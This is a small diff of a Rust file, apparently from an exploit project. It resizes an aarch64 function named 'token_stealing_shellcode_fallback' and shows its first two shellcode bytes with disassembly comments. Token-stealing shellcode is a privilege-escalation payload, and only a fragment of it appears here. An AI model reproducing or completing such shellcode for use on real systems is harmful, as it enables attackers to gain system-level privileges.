@@ -33,7 +33,7 @@ pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
 }
 
 #[cfg(all(target_arch = "aarch64", feature = "shellcode_fallback"))]
-pub fn token_stealing_shellcode_fallback() -> [u8; 84] {
+pub fn token_stealing_shellcode_fallback() -> [u8; 76] {
     return concat_bytes!(
         b"\xe0\x07\x3e\xa9", // 0000000000000000: stp x0,x1,[sp,#-0x20]
         b"\xe2\x0f\x3f\xa9", // 0000000000000004: stp x2,x3,[sp,#-0x10]
